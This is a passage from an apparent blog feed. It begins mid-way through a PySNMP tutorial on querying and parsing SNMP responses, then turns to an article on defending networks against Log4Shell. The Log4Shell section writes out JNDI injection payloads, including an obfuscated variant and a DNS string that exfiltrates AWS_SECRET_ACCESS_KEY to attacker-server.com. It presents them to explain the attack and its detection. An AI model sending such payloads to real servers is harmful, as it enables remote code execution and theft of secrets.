&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB::sysName.0 = Router1.lab.yaklin.ca&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB::sysDescr.0 = Cisco IOS Software, IOSv Software (VIOS-ADVENTERPRISEK9-M), Version 15.9(3)M2, RELEASE SOFTWARE (fc1)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Technical Support: http://www.cisco.com/techsupport&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Copyright (c) 1986-2020 by Cisco Systems, Inc.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Compiled Tue 28-Jul-20 07:09 by prod_rel_team&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you need to send an SNMP GET for one particular MIB variable, make a decision on the value that is returned and based on that decision query the same device again, there is no need to create a whole new iterator. Instead you can use the &lt;em&gt;iterator&lt;/em&gt;.send() function to query a new SNMP variable by supplying a &lt;em&gt;list&lt;/em&gt; of new ObjectType() class instances. An example of this is as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;sysDescr&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB::sysDescr.0 = Cisco IOS Software, IOSv Software (VIOS-ADVENTERPRISEK9-M), Version 15.9(3)M2, RELEASE SOFTWARE (fc1)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Technical Support: http://www.cisco.com/techsupport&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Copyright (c) 1986-2020 by Cisco Systems, Inc.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Compiled Tue 28-Jul-20 07:09 by prod_rel_team&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;error-checking-of-the-snmp-response&quot;&gt;Error Checking of the SNMP Response&lt;/h2&gt;

&lt;p&gt;Each command generator (getCmd, nextCmd, bulkCmd, setCmd) return an errorIndication, errorStatus, errorIndex, and varBinds variable. The error related variables are described as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;errorIndication: A string error message that when present indicates an SNMP Engine error&lt;/li&gt;
  &lt;li&gt;errorState: A string error message that when present indicates an SNMP PDU error&lt;/li&gt;
  &lt;li&gt;errorIndex: An integer that when non-zero indicates the position (n - 1) in varBinds that encountered the error&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Common logic on assessing these variables after each command generator is run is as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;{} at {}&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above code first checks if there was an SNMP Engine error with errorIndication and if so prints it to screen. This is followed by checking if there is an SNMP PDU error with errorStatus and if so prints out the error message to screen followed by the index in varBinds and the value at varBinds. Of course when using SNMP at scale you may not be printing these to screen but updating a database or log file with the error that was encountered, adjusting additional logic to influence how the script treats the error for subsequent queries or analysis, or any other actions your script may need to make.&lt;/p&gt;

&lt;p&gt;An example of what a timeout error might look like is by viewing the output of errorIndication when this is encountered:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;RequestTimedOut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;No SNMP response received before timeout&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;parsing-the-returned-response-data&quot;&gt;Parsing the Returned Response Data&lt;/h2&gt;

&lt;p&gt;Assuming you have gotten this far without any errors its now time to parse the response data in varBinds. PySNMP’s generator commands describe varBinds as &lt;em&gt;A sequence of ObjectType class instances representing MIB variables returned in SNMP response&lt;/em&gt;. We also know that an &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#pysnmp.smi.rfc1902.ObjectType&quot;&gt;ObjectType&lt;/a&gt; instance represents the ObjectIdentity (which MIB variable was queried) and the payload that was returned in the response. This is useful because it tells us first which MIB variable is being returned (in our case sysName) and then what the value is. In our case we only queried sysName so its a safe assumption to make that we got a response for sysName, but in the example showed earlier where we queried for both sysName and sysDescr, it would be useful to know which element in the varBinds list corresponds to which MIB variable.&lt;/p&gt;

&lt;p&gt;In our example of querying for sysName we can see that varBinds has the following structure:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;pysnmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfc1902&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; varBinds
[ObjectType(ObjectIdentity(&amp;lt;ObjectName value object, tagSet &amp;lt;TagSet object, tags 0:0:6&amp;gt;, payload [1.3.6.1.2.1.1.5.0]&amp;gt;), &amp;lt;DisplayString value object, tagSet &amp;lt;TagSet object, tags 0:0:4&amp;gt;, subtypeSpec &amp;lt;ConstraintsIntersection object, consts &amp;lt;ValueSizeConstraint object, consts 0, 65535&amp;gt;, &amp;lt;ValueSizeConstraint object, consts 0, 255&amp;gt;, &amp;lt;ValueSizeConstraint object, consts 0, 255&amp;gt;&amp;gt;, encoding iso-8859-1, payload [Router1.lab.yaklin.ca]&amp;gt;)]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There is a handy helper function called .prettyPrint() associated with ObjectType that can transform the whole response to a nice string by concatenating the MIB variable name and the response value together:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB::sysName.0 = Router1.lab.yaklin.ca&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In most scripts we will only care about the returned value and this can be accessed by referring to the payload of the ObjectType:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;Router1.lab.yaklin.ca&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;a-note-on-compiled-mibs-and-pysnmp&quot;&gt;A Note on Compiled MIB’s and PySNMP&lt;/h2&gt;

&lt;p&gt;PySNMP looks for MIB files in a few locations that have been compiled in a specific format that it understands. Out of the box PySNMP comes with a few standard MIB’s pre-compiled and this helps with translating the MIB variable names when parsing the varBinds ObjectType() instances, as well as allowing us to reference these MIB variables by name when defining the ObjectType() we want to query.&lt;/p&gt;

&lt;p&gt;In cases where we are querying based on an OID because we don’t have a MIB pre-compiled, varBinds response variables are a bit more difficult to interpret. Take as an example the following varBinds variable that I queried which has a name of entPhysicalSerialNum and an OID of 1.3.6.1.2.1.47.1.1.1.1.11 so that I can get the serial number of a router (in this case at entPhysicalIndex of 1):&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;1.3.6.1.2.1.47.1.1.1.1.11.1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When looking at the response for varBinds you can see that the MIB variable name isn’t fully translated by PySNMP:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-SMI::mib-2.47.1.1.1.1.11.1 = 9ZEB8BXGIB6LD28LWUY1O&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In an &lt;a href=&quot;/2022/01/14/compiling-mibs-for-pysnmp.html&quot;&gt;upcoming post&lt;/a&gt; I plan on highlighting how to compile MIB’s so that you’re able to reference a human readable name like entPhysicalIndex instead of its OID, and PySNMP in return is able to translate the OID back to a human readable name for you.&lt;/p&gt;</content><author><name>Brian Yaklin</name></author><category term="Python" /><category term="Automation" /><category term="SNMP" /><summary type="html">I’ve previously written about PySNMP’s simpler SNMP query using one-liner command generator as a method to send SNMP queries using an OID. That method allows you to avoid having to compile MIB’s that do not come as a default in the PySNMP library. In the next few posts I want to outline how to use PySNMP’s high-level API (hlapi) and how to complie any MIB’s that may be missing. This will help you use PySNMP in its intended fashion, and using the name of the OID which provides for better readability.</summary></entry><entry><title type="html">The Role of Network Security to Fight Log4Shell</title><link href="http://localhost:4000/2021/12/29/role-of-network-security-log4shell.html" rel="alternate" type="text/html" title="The Role of Network Security to Fight Log4Shell" /><published>2021-12-29T00:00:00-07:00</published><updated>2021-12-29T00:00:00-07:00</updated><id>http://localhost:4000/2021/12/29/role-of-network-security-log4shell</id><content type="html" xml:base="http://localhost:4000/2021/12/29/role-of-network-security-log4shell.html">&lt;p&gt;December 9th, 2021 rocked the world for a significant number of IT professionals responsible for building and protecting applications their organizations create/deploy. Apache announced &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2021-44228&quot;&gt;CVE-2021-44228&lt;/a&gt;, commonly referred to as log4Shell, a zero-day vulnerability affecting their log4j logging software. Due to the severity of the vulnerability and the relative ease at which to exploit it, it is critical to ensure that affected assets are protected. This article aims to highlight how the network plays a critical role in the protection of assets and detection of vulnerabilities like log4shell.&lt;/p&gt;

&lt;h2 id=&quot;what-is-log4j-and-jndi&quot;&gt;What is Log4J and JNDI?&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://logging.apache.org/log4j/2.x/&quot;&gt;Log4j&lt;/a&gt; is a logging package used in many Java-based applications and websites. With web servers it is a best practice to log incoming requests, allowing operators of a site to audit access, assess performance, detect attacks, and perform retroactive investigations. As an example, when a web server receives an HTTP request from a client, the clients IP address, URI, HTTP method and headers (e.g. user-agent), and other data may be logged to file. In an HTTP POST, you may also have some of the content logged.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface&quot;&gt;Java Naming and Directory Interface (JNDI)&lt;/a&gt; is used by log4j as a method of providing lookups on variables within a log by referencing naming and directory services such as LDAP, DNS, or other protocols. An example may include translating a username to groups that user is associated with, or an IP address to a FQDN. This can help build context within web server logs.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;These definitions are most certainly over simplifications of log4j and JNDI, but are hopefully specific enough for context around this vulnerability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;what-is-log4shell&quot;&gt;What is Log4Shell?&lt;/h2&gt;
&lt;h3 id=&quot;the-vulnerabilities-so-far&quot;&gt;The Vulnerabilities (So Far)&lt;/h3&gt;
&lt;p&gt;There have been multiple vulnerabilities released since log4shell/CVE-2021-44228 was announced, which have driven the need for organizations to update/patch their log4j implementations multiple times over the past several weeks.Additional vulnerabilities have been discovered in subsequent patches, but log4shell is by far the most severe and is what this article will focus on.&lt;/p&gt;

&lt;p&gt;Log4shell allows a unauthenticated remote attacker to trigger a remote code execution (RCE) on an affected server, or exfiltration of data. Any website running an affected version of log4j, especially one that is internet facing or faces an untrusted zone, is particularly susceptible to this vulnerability as any attacker on the internet with IP reachability to the website can attempt to trigger the exploit.&lt;/p&gt;

&lt;p&gt;An attacker triggers the exploit by sending a crafted JNDI string in an HTTP header such as the user-agent, or as post form data. The webserver may then log the JNDI string, inadvertantly performing a lookup on untrusted user input data. &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html&quot;&gt;Sanitization and validation of input data&lt;/a&gt; is a best practice, commonly used to prevent attacks like &lt;a href=&quot;https://owasp.org/www-community/attacks/SQL_Injection&quot;&gt;SQL injection&lt;/a&gt;. However, because the logging of an HTTP request may happen before the validation stage of data, it may be difficult to implement with untrusted data like JNDI strings that affect your logging utility.&lt;/p&gt;

&lt;h3 id=&quot;log4shell-attack-stages&quot;&gt;Log4shell Attack Stages&lt;/h3&gt;
&lt;p&gt;Log4shell is a multi-stage attack whereby an attacker sends an initial HTTP request to a web server (stage 1) and if affected, the web server performs the JNDI lookup by referencing a server the the attacker controls to download malicious code (stage 2), and then executes the malicious code (stage 3).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;User-Agent strings will be the primary examples in this article, but keep in mind that a JNDI string associated with any header or content that is logged by log4j can trigger the second phase of the attack. I also use an example destination of 127.0.0.1 but in reality this would be any IP address or hostname under the attackers control.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;An example of a malicious string in the HTTP request would be setting an HTTP header such as the user-agent, to a string such as a basic example of:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;User-Agent: ${jndi:ldap://127.0.0.1/a}&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;JNDI strings in HTTP requests can be far more complex, such as:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;User-Agent: ${${env:FOOBAR:-j}ndi:${env:FOOBAR:-l}dap${env:FOOBAR:-:}//127.0.0.1/a}&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This initial HTTP request isn’t malicious on its own. Instead, it triggers an affected web server to place an LDAP request to an attacker controlled LDAP server on the internet. The attackers LDAP server then responds with a malicious payload which the server then executes. This could then open a backdoor for the attacker to load a more comprehensive and destructive payload to the server allowing an attacker to further surveil your network, identifying other vulnerable servers, allowing an attacker to gain a larger footprint in your environment.&lt;/p&gt;

&lt;p&gt;The other aspect, which is more difficult to control (as described in the Prevention Measures section below), is a JNDI string that uses DNS instead of LDAP. An example of such a string is:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;User-Agent: ${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.attacker-server.com}&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this particular example an attacker sends a JNDI string that causes an affected web server to append an environment variable as a sub-domain to a DNS query directed at a domain/DNS server controlled by the attacker (attacker-server.com). While this doesn’t cause a vulnerable server to execute malicious code, it does signify to an attacker that a server is vulnerable and allows for exfiltration of sensitive information. Of course the environment variable actually needs to exist, but it would be easy for an attacker to send a series of HTTP requests with common environment variable names in the hopes of getting some information. Additionally, an attacker could append another sub-domain as an ID specific to the web server they are attacking, to help them keep track of which particular server was vulnerable and any environment variables related to it.&lt;/p&gt;

&lt;h2 id=&quot;the-importance-of-network-security&quot;&gt;The Importance of Network Security&lt;/h2&gt;
&lt;h3 id=&quot;the-unique-position-of-network-devices&quot;&gt;The Unique Position of Network Devices&lt;/h3&gt;
&lt;p&gt;Before a web request is received by a web server, the request is most likely going to flow through multiple network devices (e.g. routers, switches, firewalls, load balancers) managed by the organization. Even if you are in a cloud environment such as AWS, Azure, or GCP, you have the ability to place your own virtual network devices (e.g. virtual firewalls or routers), or use one of the cloud vendors native network components.&lt;/p&gt;

&lt;p&gt;Security devices that are in the path (e.g. firewalls, load balancers), or are receiving a copy of the transmitted data (e.g. using a monitor session to mirror the traffic to an intrusion detection platform) allow you to detect and possibly block multiple stages of the log4shell attack. A few examples of how you may detect and limit your impact to log4shell, from a network security perspective, include:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Regularly (and automatically) updating security signatures on firewalls, load balancers, and intrusion detection appliances.&lt;/li&gt;
  &lt;li&gt;Decrypting SSL/TLS traffic so that signatures are more effective.&lt;/li&gt;
  &lt;li&gt;Implementing a security policy that restricts the communication to and from your critical assets like web servers.&lt;/li&gt;
  &lt;li&gt;Having a robust network logging infrastructure.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;security-device-signatures-for-detection&quot;&gt;Security Device Signatures for Detection&lt;/h3&gt;
&lt;p&gt;Network security vendors use signatures to detect and potentially drop traffic that is likely to be considered malicious. Within several hours of log4shell being announced, many vendors were already releasing signature updates that their customers could use to detect log4shell. Many network security vendors signatures are focused on the first stage of the attack; detecting JNDI strings within HTTP requests. In the case of this vulnerability the situation has been extremely dynamic, and as you saw in the Log4shell Attack Stages section above, pattern matching for JNDI strings can be extremely complex. Over the days that followed the announcement of log4shell, vendors regularly updated and released new signatures for their products as the situation evolved (even several weeks after the announcement, signatures are still being released).&lt;/p&gt;

